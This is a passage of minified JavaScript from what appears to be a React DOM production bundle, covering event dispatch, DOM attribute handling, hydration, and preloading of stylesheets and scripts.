v=g.nodeName,!v||v.toLowerCase()!=="input"||g.type!=="checkbox"&&g.type!=="radio"?p&&Ys(p.elementType)&&(be=Ho):be=rm;if(be&&(be=be(e,p))){Do(A,be,l,x);break e}Y&&Y(e,g,p),e==="focusout"&&p&&g.type==="number"&&p.memoizedProps.value!=null&&Bs(g,"number",g.value)}switch(Y=p?sl(p):window,e){case"focusin":(Mo(Y)||Y.contentEditable==="true")&&(Ma=Y,ec=p,jn=null);break;case"focusout":jn=ec=Ma=null;break;case"mousedown":tc=!0;break;case"contextmenu":case"mouseup":case"dragend":tc=!1,Vo(A,l,x);break;case"selectionchange":if(hm)break;case"keydown":case"keyup":Vo(A,l,x)}var ne;if($s)e:{switch(e){case"compositionstart":var ye="onCompositionStart";break e;case"compositionend":ye="onCompositionEnd";break e;case"compositionupdate":ye="onCompositionUpdate";break e}ye=void 0}else _a?wo(e,l)&&(ye="onCompositionEnd"):e==="keydown"&&l.keyCode===229&&(ye="onCompositionStart");ye&&(Eo&&l.locale!=="ko"&&(_a||ye!=="onCompositionStart"?ye==="onCompositionEnd"&&_a&&(ne=jo()):(Al=x,Qs="value"in Al?Al.value:Al.textContent,_a=!0)),Y=ds(p,ye),0<Y.length&&(ye=new Co(ye,e,null,l,x),A.push({event:ye,listeners:Y}),ne?ye.data=ne:(ne=_o(l),ne!==null&&(ye.data=ne)))),(ne=am?nm(e,l):im(e,l))&&(ye=ds(p,"onBeforeInput"),0<ye.length&&(Y=new Co("onBeforeInput","beforeinput",null,l,x),A.push({event:Y,listeners:ye}),Y.data=ne)),$m(A,e,p,l,x)}pd(A,t)})}function Kn(e,t,l){return{instance:e,listener:t,currentTarget:l}}function ds(e,t){for(var l=t+"Capture",a=[];e!==null;){var n=e,i=n.stateNode;if(n=n.tag,n!==5&&n!==26&&n!==27||i===null||(n=mn(e,l),n!=null&&a.unshift(Kn(e,n,i)),n=mn(e,t),n!=null&&a.push(Kn(e,n,i))),e.tag===3)return a;e=e.return}return[]}function ey(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5&&e.tag!==27);return e||null}function vd(e,t,l,a,n){for(var i=t._reactName,c=[];l!==null&&l!==a;){var u=l,r=u.alternate,p=u.stateNode;if(u=u.tag,r!==null&&r===a)break;u!==5&&u!==26&&u!==27||p===null||(r=p,n?(p=mn(l,i),p!=null&&c.unshift(Kn(l,p,r))):n||(p=mn(l,i),p!=null&&c.push(Kn(l,p,r)))),l=l.return}c.length!==0&&e.push({event:t,listeners:c})}var ty=/\r\n?/g,ly=/\u0000|\uFFFD/g;function bd(e){return(typeof e=="string"?e:""+e).replace(ty,`
`).replace(ly,"")}function Sd(e,t){return t=bd(t),bd(e)===t}function Oe(e,t,l,a,n,i){switch(l){case"children":typeof a=="string"?t==="body"||t==="textarea"&&a===""||za(e,a):(typeof a=="number"||typeof a=="bigint")&&t!=="body"&&za(e,""+a);break;case"className":pi(e,"class",a);break;case"tabIndex":pi(e,"tabindex",a);break;case"dir":case"role":case"viewBox":case"width":case"height":pi(e,l,a);break;case"style":bo(e,a,i);break;case"data":if(t!=="object"){pi(e,"data",a);break}case"src":case"href":if(a===""&&(t!=="a"||l!=="href")){e.removeAttribute(l);break}if(a==null||typeof a=="function"||typeof a=="symbol"||typeof a=="boolean"){e.removeAttribute(l);break}a=vi(""+a),e.setAttribute(l,a);break;case"action":case"formAction":if(typeof a=="function"){e.setAttribute(l,"javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");break}else typeof i=="function"&&(l==="formAction"?(t!=="input"&&Oe(e,t,"name",n.name,n,null),Oe(e,t,"formEncType",n.formEncType,n,null),Oe(e,t,"formMethod",n.formMethod,n,null),Oe(e,t,"formTarget",n.formTarget,n,null)):(Oe(e,t,"encType",n.encType,n,null),Oe(e,t,"method",n.method,n,null),Oe(e,t,"target",n.target,n,null)));if(a==null||typeof a=="symbol"||typeof a=="boolean"){e.removeAttribute(l);break}a=vi(""+a),e.setAttribute(l,a);break;case"onClick":a!=null&&(e.onclick=ul);break;case"onScroll":a!=null&&he("scroll",e);break;case"onScrollEnd":a!=null&&he("scrollend",e);break;case"dangerouslySetInnerHTML":if(a!=null){if(typeof a!="object"||!("__html"in a))throw Error(m(61));if(l=a.__html,l!=null){if(n.children!=null)throw Error(m(60));e.innerHTML=l}}break;case"multiple":e.multiple=a&&typeof a!="function"&&typeof a!="symbol";break;case"muted":e.muted=a&&typeof a!="function"&&typeof a!="symbol";break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"defaultValue":case"defaultChecked":case"innerHTML":case"ref":break;case"autoFocus":break;case"xlinkHref":if(a==null||typeof a=="function"||typeof a=="boolean"||typeof a=="symbol"){e.removeAttribute("xlink:href");break}l=vi(""+a),e.setAttributeNS("http://www.w3.org/1999/xlink","xlink:href",l);break;case"contentEditable":case"spellCheck":case"draggable":case"value":case"autoReverse":case"externalResourcesRequired":case"focusable":case"preserveAlpha":a!=null&&typeof a!="function"&&typeof a!="symbol"?e.setAttribute(l,""+a):e.removeAttribute(l);break;case"inert":case"allowFullScreen":case"async":case"autoPlay":case"controls":case"default":case"defer":case"disabled":case"disablePictureInPicture":case"disableRemotePlayback":case"formNoValidate":case"hidden":case"loop":case"noModule":case"noValidate":case"open":case"playsInline":case"readOnly":case"required":case"reversed":case"scoped":case"seamless":case"itemScope":a&&typeof a!="function"&&typeof a!="symbol"?e.setAttribute(l,""):e.removeAttribute(l);break;case"capture":case"download":a===!0?e.setAttribute(l,""):a!==!1&&a!=null&&typeof a!="function"&&typeof a!="symbol"?e.setAttribute(l,a):e.removeAttribute(l);break;case"cols":case"rows":case"size":case"span":a!=null&&typeof a!="function"&&typeof a!="symbol"&&!isNaN(a)&&1<=a?e.setAttribute(l,a):e.removeAttribute(l);break;case"rowSpan":case"start":a==null||typeof a=="function"||typeof a=="symbol"||isNaN(a)?e.removeAttribute(l):e.setAttribute(l,a);break;case"popover":he("beforetoggle",e),he("toggle",e),yi(e,"popover",a);break;case"xlinkActuate":cl(e,"http://www.w3.org/1999/xlink","xlink:actuate",a);break;case"xlinkArcrole":cl(e,"http://www.w3.org/1999/xlink","xlink:arcrole",a);break;case"xlinkRole":cl(e,"http://www.w3.org/1999/xlink","xlink:role",a);break;case"xlinkShow":cl(e,"http://www.w3.org/1999/xlink","xlink:show",a);break;case"xlinkTitle":cl(e,"http://www.w3.org/1999/xlink","xlink:title",a);break;case"xlinkType":cl(e,"http://www.w3.org/1999/xlink","xlink:type",a);break;case"xmlBase":cl(e,"http://www.w3.org/XML/1998/namespace","xml:base",a);break;case"xmlLang":cl(e,"http://www.w3.org/XML/1998/namespace","xml:lang",a);break;case"xmlSpace":cl(e,"http://www.w3.org/XML/1998/namespace","xml:space",a);break;case"is":yi(e,"is",a);break;case"innerText":case"textContent":break;default:(!(2<l.length)||l[0]!=="o"&&l[0]!=="O"||l[1]!=="n"&&l[1]!=="N")&&(l=wh.get(l)||l,yi(e,l,a))}}function Au(e,t,l,a,n,i){switch(l){case"style":bo(e,a,i);break;case"dangerouslySetInnerHTML":if(a!=null){if(typeof a!="object"||!("__html"in a))throw Error(m(61));if(l=a.__html,l!=null){if(n.children!=null)throw Error(m(60));e.innerHTML=l}}break;case"children":typeof a=="string"?za(e,a):(typeof a=="number"||typeof a=="bigint")&&za(e,""+a);break;case"onScroll":a!=null&&he("scroll",e);break;case"onScrollEnd":a!=null&&he("scrollend",e);break;case"onClick":a!=null&&(e.onclick=ul);break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"innerHTML":case"ref":break;case"innerText":case"textContent":break;default:if(!oo.hasOwnProperty(l))e:{if(l[0]==="o"&&l[1]==="n"&&(n=l.endsWith("Capture"),t=l.slice(2,n?l.length-7:void 0),i=e[fe]||null,i=i!=null?i[l]:null,typeof i=="function"&&e.removeEventListener(t,i,n),typeof a=="function")){typeof i!="function"&&i!==null&&(l in e?e[l]=null:e.hasAttribute(l)&&e.removeAttribute(l)),e.addEventListener(t,a,n);break e}l in e?e[l]=a:a===!0?e.setAttribute(l,""):yi(e,l,a)}}}function rt(e,t,l){switch(t){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"img":he("error",e),he("load",e);var a=!1,n=!1,i;for(i in l)if(l.hasOwnProperty(i)){var c=l[i];if(c!=null)switch(i){case"src":a=!0;break;case"srcSet":n=!0;break;case"children":case"dangerouslySetInnerHTML":throw Error(m(137,t));default:Oe(e,t,i,c,l,null)}}n&&Oe(e,t,"srcSet",l.srcSet,l,null),a&&Oe(e,t,"src",l.src,l,null);return;case"input":he("invalid",e);var u=i=c=n=null,r=null,p=null;for(a in l)if(l.hasOwnProperty(a)){var x=l[a];if(x!=null)switch(a){case"name":n=x;break;case"type":c=x;break;case"checked":r=x;break;case"defaultChecked":p=x;break;case"value":i=x;break;case"defaultValue":u=x;break;case"children":case"dangerouslySetInnerHTML":if(x!=null)throw Error(m(137,t));break;default:Oe(e,t,a,x,l,null)}}yo(e,i,u,r,p,c,n,!1);return;case"select":he("invalid",e),a=c=i=null;for(n in l)if(l.hasOwnProperty(n)&&(u=l[n],u!=null))switch(n){case"value":i=u;break;case"defaultValue":c=u;break;case"multiple":a=u;default:Oe(e,t,n,u,l,null)}t=i,l=c,e.multiple=!!a,t!=null?Ea(e,!!a,t,!1):l!=null&&Ea(e,!!a,l,!0);return;case"textarea":he("invalid",e),i=n=a=null;for(c in l)if(l.hasOwnProperty(c)&&(u=l[c],u!=null))switch(c){case"value":a=u;break;case"defaultValue":n=u;break;case"children":i=u;break;case"dangerouslySetInnerHTML":if(u!=null)throw Error(m(91));break;default:Oe(e,t,c,u,l,null)}go(e,a,n,i);return;case"option":for(r in l)l.hasOwnProperty(r)&&(a=l[r],a!=null)&&(r==="selected"?e.selected=a&&typeof a!="function"&&typeof a!="symbol":Oe(e,t,r,a,l,null));return;case"dialog":he("beforetoggle",e),he("toggle",e),he("cancel",e),he("close",e);break;case"iframe":case"object":he("load",e);break;case"video":case"audio":for(a=0;a<Zn.length;a++)he(Zn[a],e);break;case"image":he("error",e),he("load",e);break;case"details":he("toggle",e);break;case"embed":case"source":case"link":he("error",e),he("load",e);case"area":case"base":case"br":case"col":case"hr":case"keygen":case"meta":case"param":case"track":case"wbr":case"menuitem":for(p in l)if(l.hasOwnProperty(p)&&(a=l[p],a!=null))switch(p){case"children":case"dangerouslySetInnerHTML":throw Error(m(137,t));default:Oe(e,t,p,a,l,null)}return;default:if(Ys(t)){for(x in l)l.hasOwnProperty(x)&&(a=l[x],a!==void 0&&Au(e,t,x,a,l,void 0));return}}for(u in l)l.hasOwnProperty(u)&&(a=l[u],a!=null&&Oe(e,t,u,a,l,null))}function ay(e,t,l,a){switch(t){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"input":var n=null,i=null,c=null,u=null,r=null,p=null,x=null;for(v in l){var A=l[v];if(l.hasOwnProperty(v)&&A!=null)switch(v){case"checked":break;case"value":break;case"defaultValue":r=A;default:a.hasOwnProperty(v)||Oe(e,t,v,null,a,A)}}for(var g in a){var v=a[g];if(A=l[g],a.hasOwnProperty(g)&&(v!=null||A!=null))switch(g){case"type":i=v;break;case"name":n=v;break;case"checked":p=v;break;case"defaultChecked":x=v;break;case"value":c=v;break;case"defaultValue":u=v;break;case"children":case"dangerouslySetInnerHTML":if(v!=null)throw Error(m(137,t));break;default:v!==A&&Oe(e,t,g,v,a,A)}}Ls(e,c,u,r,p,x,i,n);return;case"select":v=c=u=g=null;for(i in l)if(r=l[i],l.hasOwnProperty(i)&&r!=null)switch(i){case"value":break;case"multiple":v=r;default:a.hasOwnProperty(i)||Oe(e,t,i,null,a,r)}for(n in a)if(i=a[n],r=l[n],a.hasOwnProperty(n)&&(i!=null||r!=null))switch(n){case"value":g=i;break;case"defaultValue":u=i;break;case"multiple":c=i;default:i!==r&&Oe(e,t,n,i,a,r)}t=u,l=c,a=v,g!=null?Ea(e,!!l,g,!1):!!a!=!!l&&(t!=null?Ea(e,!!l,t,!0):Ea(e,!!l,l?[]:"",!1));return;case"textarea":v=g=null;for(u in l)if(n=l[u],l.hasOwnProperty(u)&&n!=null&&!a.hasOwnProperty(u))switch(u){case"value":break;case"children":break;default:Oe(e,t,u,null,a,n)}for(c in a)if(n=a[c],i=l[c],a.hasOwnProperty(c)&&(n!=null||i!=null))switch(c){case"value":g=n;break;case"defaultValue":v=n;break;case"children":break;case"dangerouslySetInnerHTML":if(n!=null)throw Error(m(91));break;default:n!==i&&Oe(e,t,c,n,a,i)}po(e,g,v);return;case"option":for(var L in l)g=l[L],l.hasOwnProperty(L)&&g!=null&&!a.hasOwnProperty(L)&&(L==="selected"?e.selected=!1:Oe(e,t,L,null,a,g));for(r in a)g=a[r],v=l[r],a.hasOwnProperty(r)&&g!==v&&(g!=null||v!=null)&&(r==="selected"?e.selected=g&&typeof g!="function"&&typeof g!="symbol":Oe(e,t,r,g,a,v));return;case"img":case"link":case"area":case"base":case"br":case"col":case"embed":case"hr":case"keygen":case"meta":case"param":case"source":case"track":case"wbr":case"menuitem":for(var J in l)g=l[J],l.hasOwnProperty(J)&&g!=null&&!a.hasOwnProperty(J)&&Oe(e,t,J,null,a,g);for(p in a)if(g=a[p],v=l[p],a.hasOwnProperty(p)&&g!==v&&(g!=null||v!=null))switch(p){case"children":case"dangerouslySetInnerHTML":if(g!=null)throw Error(m(137,t));break;default:Oe(e,t,p,g,a,v)}return;default:if(Ys(t)){for(var we in l)g=l[we],l.hasOwnProperty(we)&&g!==void 0&&!a.hasOwnProperty(we)&&Au(e,t,we,void 0,a,g);for(x in a)g=a[x],v=l[x],!a.hasOwnProperty(x)||g===v||g===void 0&&v===void 0||Au(e,t,x,g,a,v);return}}for(var h in l)g=l[h],l.hasOwnProperty(h)&&g!=null&&!a.hasOwnProperty(h)&&Oe(e,t,h,null,a,g);for(A in a)g=a[A],v=l[A],!a.hasOwnProperty(A)||g===v||g==null&&v==null||Oe(e,t,A,g,a,v)}function xd(e){switch(e){case"css":case"script":case"font":case"img":case"image":case"input":case"link":return!0;default:return!1}}function ny(){if(typeof performance.getEntriesByType=="function"){for(var e=0,t=0,l=performance.getEntriesByType("resource"),a=0;a<l.length;a++){var n=l[a],i=n.transferSize,c=n.initiatorType,u=n.duration;if(i&&u&&xd(c)){for(c=0,u=n.responseEnd,a+=1;a<l.length;a++){var r=l[a],p=r.startTime;if(p>u)break;var x=r.transferSize,A=r.initiatorType;x&&xd(A)&&(r=r.responseEnd,c+=x*(r<u?1:(u-p)/(r-p)))}if(--a,t+=8*(i+c)/(n.duration/1e3),e++,10<e)break}}if(0<e)return t/e/1e6}return navigator.connection&&(e=navigator.connection.downlink,typeof e=="number")?e:5}var Eu=null,zu=null;function hs(e){return e.nodeType===9?e:e.ownerDocument}function jd(e){switch(e){case"http://www.w3.org/2000/svg":return 1;case"http://www.w3.org/1998/Math/MathML":return 2;default:return 0}}function Td(e,t){if(e===0)switch(t){case"svg":return 1;case"math":return 2;default:return 0}return e===1&&t==="foreignObject"?0:e}function Ou(e,t){return e==="textarea"||e==="noscript"||typeof t.children=="string"||typeof t.children=="number"||typeof t.children=="bigint"||typeof t.dangerouslySetInnerHTML=="object"&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var wu=null;function iy(){var e=window.event;return e&&e.type==="popstate"?e===wu?!1:(wu=e,!0):(wu=null,!1)}var Nd=typeof setTimeout=="function"?setTimeout:void 0,sy=typeof clearTimeout=="function"?clearTimeout:void 0,Cd=typeof Promise=="function"?Promise:void 0,cy=typeof queueMicrotask=="function"?queueMicrotask:typeof Cd<"u"?function(e){return Cd.resolve(null).then(e).catch(uy)}:Nd;function uy(e){setTimeout(function(){throw e})}function Vl(e){return e==="head"}function Ad(e,t){var l=t,a=0;do{var n=l.nextSibling;if(e.removeChild(l),n&&n.nodeType===8)if(l=n.data,l==="/$"||l==="/&"){if(a===0){e.removeChild(n),sn(t);return}a--}else if(l==="$"||l==="$?"||l==="$~"||l==="$!"||l==="&")a++;else if(l==="html")Jn(e.ownerDocument.documentElement);else if(l==="head"){l=e.ownerDocument.head,Jn(l);for(var i=l.firstChild;i;){var c=i.nextSibling,u=i.nodeName;i[Pl]||u==="SCRIPT"||u==="STYLE"||u==="LINK"&&i.rel.toLowerCase()==="stylesheet"||l.removeChild(i),i=c}}else l==="body"&&Jn(e.ownerDocument.body);l=n}while(l);sn(t)}function Ed(e,t){var l=e;e=0;do{var a=l.nextSibling;if(l.nodeType===1?t?(l._stashedDisplay=l.style.display,l.style.display="none"):(l.style.display=l._stashedDisplay||"",l.getAttribute("style")===""&&l.removeAttribute("style")):l.nodeType===3&&(t?(l._stashedText=l.nodeValue,l.nodeValue=""):l.nodeValue=l._stashedText||""),a&&a.nodeType===8)if(l=a.data,l==="/$"){if(e===0)break;e--}else l!=="$"&&l!=="$?"&&l!=="$~"&&l!=="$!"||e++;l=a}while(l)}function _u(e){var t=e.firstChild;for(t&&t.nodeType===10&&(t=t.nextSibling);t;){var l=t;switch(t=t.nextSibling,l.nodeName){case"HTML":case"HEAD":case"BODY":_u(l),Pe(l);continue;case"SCRIPT":case"STYLE":continue;case"LINK":if(l.rel.toLowerCase()==="stylesheet")continue}e.removeChild(l)}}function oy(e,t,l,a){for(;e.nodeType===1;){var n=l;if(e.nodeName.toLowerCase()!==t.toLowerCase()){if(!a&&(e.nodeName!=="INPUT"||e.type!=="hidden"))break}else if(a){if(!e[Pl])switch(t){case"meta":if(!e.hasAttribute("itemprop"))break;return e;case"link":if(i=e.getAttribute("rel"),i==="stylesheet"&&e.hasAttribute("data-precedence"))break;if(i!==n.rel||e.getAttribute("href")!==(n.href==null||n.href===""?null:n.href)||e.getAttribute("crossorigin")!==(n.crossOrigin==null?null:n.crossOrigin)||e.getAttribute("title")!==(n.title==null?null:n.title))break;return e;case"style":if(e.hasAttribute("data-precedence"))break;return e;case"script":if(i=e.getAttribute("src"),(i!==(n.src==null?null:n.src)||e.getAttribute("type")!==(n.type==null?null:n.type)||e.getAttribute("crossorigin")!==(n.crossOrigin==null?null:n.crossOrigin))&&i&&e.hasAttribute("async")&&!e.hasAttribute("itemprop"))break;return e;default:return e}}else if(t==="input"&&e.type==="hidden"){var i=n.name==null?null:""+n.name;if(n.type==="hidden"&&e.getAttribute("name")===i)return e}else return e;if(e=Vt(e.nextSibling),e===null)break}return null}function ry(e,t,l){if(t==="")return null;for(;e.nodeType!==3;)if((e.nodeType!==1||e.nodeName!=="INPUT"||e.type!=="hidden")&&!l||(e=Vt(e.nextSibling),e===null))return null;return e}function zd(e,t){for(;e.nodeType!==8;)if((e.nodeType!==1||e.nodeName!=="INPUT"||e.type!=="hidden")&&!t||(e=Vt(e.nextSibling),e===null))return null;return e}function Mu(e){return e.data==="$?"||e.data==="$~"}function Du(e){return e.data==="$!"||e.data==="$?"&&e.ownerDocument.readyState!=="loading"}function fy(e,t){var l=e.ownerDocument;if(e.data==="$~")e._reactRetry=t;else if(e.data!=="$?"||l.readyState!=="loading")t();else{var a=function(){t(),l.removeEventListener("DOMContentLoaded",a)};l.addEventListener("DOMContentLoaded",a),e._reactRetry=a}}function Vt(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t==="$"||t==="$!"||t==="$?"||t==="$~"||t==="&"||t==="F!"||t==="F")break;if(t==="/$"||t==="/&")return null}}return e}var Hu=null;function Od(e){e=e.nextSibling;for(var t=0;e;){if(e.nodeType===8){var l=e.data;if(l==="/$"||l==="/&"){if(t===0)return Vt(e.nextSibling);t--}else l!=="$"&&l!=="$!"&&l!=="$?"&&l!=="$~"&&l!=="&"||t++}e=e.nextSibling}return null}function wd(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var l=e.data;if(l==="$"||l==="$!"||l==="$?"||l==="$~"||l==="&"){if(t===0)return e;t--}else l!=="/$"&&l!=="/&"||t++}e=e.previousSibling}return null}function _d(e,t,l){switch(t=hs(l),e){case"html":if(e=t.documentElement,!e)throw Error(m(452));return e;case"head":if(e=t.head,!e)throw Error(m(453));return e;case"body":if(e=t.body,!e)throw Error(m(454));return e;default:throw Error(m(451))}}function Jn(e){for(var t=e.attributes;t.length;)e.removeAttributeNode(t[0]);Pe(e)}var Xt=new Map,Md=new Set;function ms(e){return typeof e.getRootNode=="function"?e.getRootNode():e.nodeType===9?e:e.ownerDocument}var Nl=_.d;_.d={f:dy,r:hy,D:my,C:yy,L:py,m:gy,X:by,S:vy,M:Sy};function dy(){var e=Nl.f(),t=is();return e||t}function hy(e){var t=il(e);t!==null&&t.tag===5&&t.type==="form"?Jr(t):Nl.r(e)}var ln=typeof document>"u"?null:document;function Dd(e,t,l){var a=ln;if(a&&typeof t=="string"&&t){var n=Rt(t);n='link[rel="'+e+'"][href="'+n+'"]',typeof l=="string"&&(n+='[crossorigin="'+l+'"]'),Md.has(n)||(Md.add(n),e={rel:e,crossOrigin:l,href:t},a.querySelector(n)===null&&(t=a.createElement("link"),rt(t,"link",e),nt(t),a.head.appendChild(t)))}}function my(e){Nl.D(e),Dd("dns-prefetch",e,null)}function yy(e,t){Nl.C(e,t),Dd("preconnect",e,t)}function py(e,t,l){Nl.L(e,t,l);var a=ln;if(a&&e&&t){var n='link[rel="preload"][as="'+Rt(t)+'"]';t==="image"&&l&&l.imageSrcSet?(n+='[imagesrcset="'+Rt(l.imageSrcSet)+'"]',typeof l.imageSizes=="string"&&(n+='[imagesizes="'+Rt(l.imageSizes)+'"]')):n+='[href="'+Rt(e)+'"]';var i=n;switch(t){case"style":i=an(e);break;case"script":i=nn(e)}Xt.has(i)||(e=Q({rel:"preload",href:t==="image"&&l&&l.imageSrcSet?void 0:e,as:t},l),Xt.set(i,e),a.querySelector(n)!==null||t==="style"&&a.querySelector(Wn(i))||t==="script"&&a.querySelector($n(i))||(t=a.createElement("link"),rt(t,"link",e),nt(t),a.head.appendChild(t)))}}function gy(e,t){Nl.m(e,t);var l=ln;if(l&&e){var a=t&&typeof t.as=="string"?t.as:"script",n='link[rel="modulepreload"][as="'+Rt(a)+'"][href="'+Rt(e)+'"]',i=n;switch(a){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":i=nn(e)}if(!Xt.has(i)&&(e=Q({rel:"modulepreload",href:e},t),Xt.set(i,e),l.querySelector(n)===null)){switch(a){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":if(l.querySelector($n(i)))return}a=l.createElement("link"),rt(a,"link",e),nt(a),l.head.appendChild(a)}}}function vy(e,t,l){Nl.S(e,t,l);var a=ln;if(a&&e){var n=Ca(a).hoistableStyles,i=an(e);t=t||"default";var c=n.get(i);if(!c){var u={loading:0,preload:null};if(c=a.querySelector(Wn(i)))u.loading=5;else{e=Q({rel:"stylesheet",href:e,"data-precedence":t},l),(l=Xt.get(i))&&ku(e,l);var r=c=a.createElement("link");nt(r),rt(r,"link",e),r._p=new Promise(function(p,x){r.onload=p,r.onerror=x}),r.addEventListener("load",function(){u.loading|=1}),r.addEventListener("error",function(){u.loading|=2}),u.loading|=4,ys(c,t,a)}c={type:"stylesheet",instance:c,count:1,state:u},n.set(i,c)}}}function by(e,t){Nl.X(e,t);var l=ln;if(l&&e){var a=Ca(l).hoistableScripts,n=nn(e),i=a.get(n);i||(i=l.querySelector($n(n)),i||(e=Q({src:e,async:!0},t),(t=Xt.get(n))&&Ru(e,t),i=l.createElement("script"),nt(i),rt(i,"link",e),l.head.appendChild(i)),i={type:"script",instance:i,count:1,state:null},a.set(n,i))}}function Sy(e,t){Nl.M(e,t);var l=ln;if(l&&e){var a=Ca(l).hoistableScripts,n=nn(e),i=a.get(n);i||(i=l.querySelector($n(n)),i||(e=Q({src:e,async:!0,type:"module"},t),(t=Xt.get(n))&&Ru(e,t),i=l.createElement("script"),nt(i),rt(i,"link",e),l.head.appendChild(i)),i={type:"script",instance:i,count:1,state:null},a.set(n,i))}}function Hd(e,t,l,a){var n=(n=ie.current)?ms(n):null;if(!n)throw Error(m(446));switch(e){case"meta":case"title":return null;case"style":return typeof l.precedence=="string"&&typeof l.href=="string"?(t=an(l.href),l=Ca(n).hoistableStyles,a=l.get(t),a||(a={type:"style",instance:null,count:0,state:null},l.set(t,a)),a):{type:"void",instance:null,count:0,state:null};case"link":if(l.rel==="stylesheet"&&typeof l.href=="string"&&typeof l.precedence=="string"){e=an(l.href);var i=Ca(n).hoistableStyles,c=i.get(e);if(c||(n=n.ownerDocument||n,c={type:"stylesheet",instance:null,count:0,state:{loading:0,preload:null}},i.set(e,c),(i=n.querySelector(Wn(e)))&&!i._p&&(c.instance=i,c.state.loading=5),Xt.has(e)||(l={rel:"preload",as:"style",href:l.href,crossOrigin:l.crossOrigin,integrity:l.integrity,media:l.media,hrefLang:l.hrefLang,referrerPolicy:l.referrerPolicy},Xt.set(e,l),i||xy(n,e,l,c.state))),t&&a===null)throw Error(m(528,""));return c}if(t&&a!==null)throw Error(m(529,""));return null;case"script":return t=l.async,l=l.src,typeof l=="string"&&t&&typeof t!="function"&&typeof t!="symbol"?(t=nn(l),l=Ca(n).hoistableScripts,a=l.get(t),a||(a={type:"script",instance:null,count:0,state:null},l.set(t,a)),a):{type:"void",instance:null,count:0,state:null};default:throw Error(m(444,e))}}function an(e){return'href="'+Rt(e)+'"'}function Wn(e){return'link[rel="stylesheet"]['+e+"]"}function kd(e){return Q({},e,{"data-precedence":e.precedence,precedence:null})}function xy(e,t,l,a){e.querySelector('link[rel="preload"][as="style"]['+t+"]")?a.loading=1:(t=e.createElement("link"),a.preload=t,t.addEventListener("load",function(){return a.loading|=1}),t.addEventListener("error",function(){return a.loading|=2}),rt(t,"link",l),nt(t),e.head.appendChild(t))}function nn(e){return'[src="'+Rt(e)+'"]'}function $n(e){return"script[async]"+e}function Rd(e,t,l){if(t.count++,t.instance===null)switch(t.type){case"style":var a=e.querySelector('style[data-href~="'+Rt(l.href)+'"]');if(a)return t.instance=a,nt(a),a;var n=Q({},l,{"data-href":l.href,"data-precedence":l.precedence,href:null,precedence:null});return a=(e.ownerDocument||e).createElement("style"),nt(a),rt(a,"style",n),ys(a,l.precedence,e),t.instance=a;case"stylesheet":n=an(l.href);var i=e.querySelector(Wn(n));if(i)return t.state.loading|=4,t.instance=i,nt(i),i;a=kd(l),(n=Xt.get(n))&&ku(a,n),i=(e.ownerDocument||e).createElement("link"),nt(i);var c=i;return c._p=new Promise(function(u,r){c.onload=u,c.onerror=r}),rt(i,"link",a),t.state.loading|=4,ys(i,l.precedence,e),t.instance=i;case"script":return i=nn(l.src),(n=e.querySelector($n(i)))?(t.instance=n,nt(n),n):(a=l,(n=Xt.get(i))&&(a=Q({},l),Ru(a,n)),e=e.ownerDocument||e,n=e.createElement("script"),nt(n),rt(n,"link",a),e.head.appendChild(n),t.instance=n);case"void":return null;default:throw Error(m(443,t.type))}else t.type==="stylesheet"&&(t.state.loading&4)===0&&(a=t.instance,t.state.loading|=4,ys(a,l.precedence,e));return t.instance}function ys(e,t,l){for(var a=l.querySelectorAll('link[rel="stylesheet"][data-precedence],style[data-precedence]'),n=a.length?a[a.length-1]:null,i=n,c=0;c<a.length;c++){var u=a[c];if(u.dataset.precedence===t)i=u;else if(i!==n)break}i?i.parentNode.insertBefore(e,i.nextSibling):(t=l.nodeType===9?l.head:l,t.insertBefore(e,t.firstChild))}function ku(e,t){e.crossOrigin==null&&(e.crossOrigin=t.crossOrigin),e.referrerPolicy==null&&(e.referrerPolicy=t.referrerPolicy),e.title==null&&(e.title=t.title)}function Ru(e,t){e.crossOrigin==null&&(e.crossOrigin=t.crossOrigin),e.referrerPolicy==null&&(e.referrerPolicy=t.referrerPolicy),e.integrity==null&&(e.integrity=t.integrity)}var ps=null;function Ud(e,t,l){if(ps===null){var a=new Map,n=ps=new Map;n.set(l,a)}else n=ps,a=n.get(l),a||(a=new Map,n.set(l,a));if(a.has(e))return a;for(a.set(e,null),l=l.getElementsByTagName(e),n=0;n<l.length;n++){var i=l[n];if(!(i[Pl]||i[$]||e==="link"&&i.getAttribute("rel")==="stylesheet")&&i.namespaceURI!=="http://www.w3.org/2000/svg"){var c=i.getAttribute(t)||"";c=e+c;var u=a.get(c);u?u.push(i):a.set(c,[i])}}return a}function Ld(e,t,l){e=e.ownerDocument||e,e.head.insertBefore(l,t==="title"?e.querySelector("head > title"):null)}function jy(e,t,l){if(l===1||t.itemProp!=null)return!1;switch(e){case"meta":case"title":return!0;case"style":if(typeof t.precedence!="string"||typeof t.href!="string"||t.href==="")break;return!0;case"link":if(typeof t.rel!="string"||typeof t.href!="string"||t.href===""||t.onLoad||t.onError)break;return t.rel==="stylesheet"?(e=t.disabled,typeof t.precedence=="string"&&e==null):!0;case"script":if(t.async&&typeof t.async!="function"&&typeof t.async!="symbol"&&!t.onLoad&&!t.onError&&t.src&&typeof t.src=="string")return!0}return!1}function Bd(e){return!(e.type==="stylesheet"&&(e.state.loading&3)===0)}function Ty(e,t,l,a){if(l.type==="stylesheet"&&(typeof a.media!="string"||matchMedia(a.media).matches!==!1)&&(l.state.loading&4)===0){if(l.instance===null){var n=an(a.href),i=t.querySelector(Wn(n));if(i){t=i._p,t!==null&&typeof t=="object"&&typeof t.then=="function"&&(e.count++,e=gs.bind(e),t.then(e,e)),l.state.loading|=4,l.instance=i,nt(i);return}i=t.ownerDocument||t,a=kd(a),(n=Xt.get(n))&&ku(a,n),i=i.createElement("link"),nt(i);var c=i;c._p=new 